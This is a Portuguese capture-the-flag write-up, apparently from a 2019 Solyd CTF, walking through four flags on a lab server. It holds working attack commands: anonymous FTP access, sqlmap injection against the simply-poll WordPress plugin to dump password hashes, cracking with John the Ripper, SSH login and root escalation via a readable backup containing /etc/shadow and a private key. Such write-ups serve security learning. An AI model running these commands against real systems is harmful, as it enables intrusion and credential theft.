@@ -1,0 +1,256 @@
+CTF 2019 – Solyd (Write-up)
+1. Começando suas aventuras
+Flag 1 – Acesso via FTP anônimo
+
+Durante a enumeração inicial foi realizado um scan com Nmap, onde foi identificada a porta 21 (FTP) aberta.
+
+Foi possível realizar login utilizando o usuário anonymous sem senha.
+
+ftp 3.219.234.210
+Conexão FTP
+Connected to 3.219.234.210.
+220 (vsFTPd 3.0.3)
+
+Name: anonymous
+Password:
+
+230 Login successful.
+
+Após ativar o modo passivo e listar os diretórios:
+
+ls -la
+
+Foi encontrado o diretório:
+
+Comunicados
+
+Ao acessar o diretório e listar os arquivos:
+
+cd Comunicados
+ls -la
+
+Foi identificado um arquivo oculto:
+
+.aviso!
+
+Download do arquivo:
+
+get .aviso!
+
+Conteúdo do arquivo:
+
+Quem foi que colocou aquele site wordpress no ar?
+
+Minha equipe fez apenas alguns posts e instalou pouquissimos plugins.
+Ele ainda esta longe do 100%, por favor retira-lo o quanto antes.
+Flag 1
+Solyd{c4r3ful_w1th_an0nym0us_ftp}
+Flag 2 – Exploração de plugin WordPress
+
+Após enumeração de diretórios no servidor web foi identificado um diretório:
+
+/wordpress
+
+Foi executado um scan utilizando WPScan, que identificou o plugin vulnerável:
+
+simply-poll
+version: 1.4.1
+
+Na base de dados do Exploit-DB foi identificado que esse plugin possui vulnerabilidades:
+
+XSS
+
+SQL Injection
+
+Foi utilizada a exploração de SQL Injection.
+
+Comando sugerido no Exploit-DB
+sqlmap -u "http://example.com/wp-admin/admin-ajax.php"
+--data="action=spAjaxResults&pollid=2"
+--dump -T wp_users -D wordpress
+--threads=10 --random-agent --dbms=mysql --level=5 --risk=3
+Comando utilizado no ataque
+sqlmap -u "http://3.219.234.210/wp-admin/admin-ajax.php"
+--data="action=spAjaxResults&pollid=2"
+--threads=10 --random-agent --dbms=mysql --batch --dbs
+
+Foi identificado o banco de dados:
+
+rookie
+
+Listagem de tabelas:
+
+sqlmap -u "http://3.219.234.210/wp-admin/admin-ajax.php" \
+--data="action=spAjaxResults&pollid=2" \
+--threads=10 --random-agent --dbms=mysql --batch \
+-D rookie --tables
+
+Foi encontrada a tabela:
+
+wp_users
+
+Dump da tabela:
+
+sqlmap -u "http://3.219.234.210/wp-admin/admin-ajax.php" \
+--data="action=spAjaxResults&pollid=2" \
+--threads=10 --random-agent --dbms=mysql --batch \
+-D rookie -T wp_users --dump
+
+O dump revelou:
+
+usuários do WordPress
+
+hashes de senha
+
+segunda flag
+
+Flag 2
+Solyd{w34k_plug1ns_3v3rywher3}
+Flag 3 – Quebra de hash e acesso SSH
+
+Ao acessar o site:
+
+http://3.219.234.210/wordpress
+
+Foi possível identificar que o usuário estagiario fazia posts com privilégios de administrador.
+
+No banco de dados obtido via SQL Injection também foi encontrada a hash desse usuário.
+
+A hash foi salva em um arquivo:
+
+hash.txt
+
+Quebra da hash utilizando John the Ripper:
+
+john hash.txt --wordlist=rockyou.txt
+
+⚠️ Observação: a wordlist rockyou precisa estar descompactada.
+
+Senha descoberta:
+
+tiktok
+
+Também foi identificado via Nmap que a porta 22 (SSH) estava aberta.
+
+Login SSH:
+
+ssh estagiario@3.219.234.210
+
+Senha:
+
+tiktok
+
+Após login:
+
+ls -la
+
+Foi encontrado o arquivo:
+
+flag3
+Flag 3
+Solyd{f0ll0w_th3_p4ssw0rd_rul3s}
+Flag 4 – Escalação de privilégios
+
+Dentro do SSH foi encontrado o arquivo:
+
+Politicas_de_senhas
+
+O arquivo mencionava um usuário chamado carlos, chefe da TI.
+
+Foi analisado o histórico de comandos do usuário:
+
+cat .bash_history
+
+No histórico foi possível observar:
+
+criação de um script chamado backup.sh
+
+envio de arquivos utilizando nc
+
+criação de um arquivo:
+
+Trabalho_Estagiario.zip
+
+Também foi identificado um diretório:
+
+flag4
+
+Porém sem permissão de acesso.
+
+Análise do script backup.sh
+
+Dentro da home do usuário foi encontrado o script:
+
+backup.sh
+
+Conteúdo:
+
+#!/bin/bash
+
+cp -R /root /var/backups
+cp -R /etc /var/backups/root
+zip -P estagiario -r Trabalho_Estagiario.zip /var/backups/root && mv Trabalho_Estagiario.zip /var/backups
+sudo chmod -R ugo+rw /var/backups/Trabalho_Estagiario.zip
+sudo chmod -R estagiario /var/backups/Trabalho_Estagiario.zip
+rm -r /var/backups/root
+
+Observações importantes:
+
+O ZIP possui senha estagiario
+
+O arquivo recebe permissões amplas
+
+Contém backup de:
+
+/root
+/etc
+Extração do backup
+
+Foi acessado o diretório:
+
+/var/backups
+
+Localizando o arquivo:
+
+Trabalho_Estagiario.zip
+
+Extração do arquivo:
+
+unzip Trabalho_Estagiario.zip
+
+Senha:
+
+estagiario
+
+Dentro do ZIP foi encontrada uma cópia de:
+
+/etc
+/root
+
+Isso permitiu acessar arquivos sensíveis como:
+
+/etc/shadow
+
+e também a pasta:
+
+/root/.ssh
+
+Dentro dela havia uma chave RSA privada.
+
+Escalação para root
+
+Utilizando a chave encontrada:
+
+ssh root@127.0.0.1 -i rsa
+
+A autenticação foi realizada com sucesso.
+
+Após acessar o sistema como root, foi possível entrar no diretório:
+
+flag4
+
+Listando os arquivos:
+
+ls -la
+Flag 4
+Solyd{0wn3d_th3_bug_b0unty_pr0gr4m}
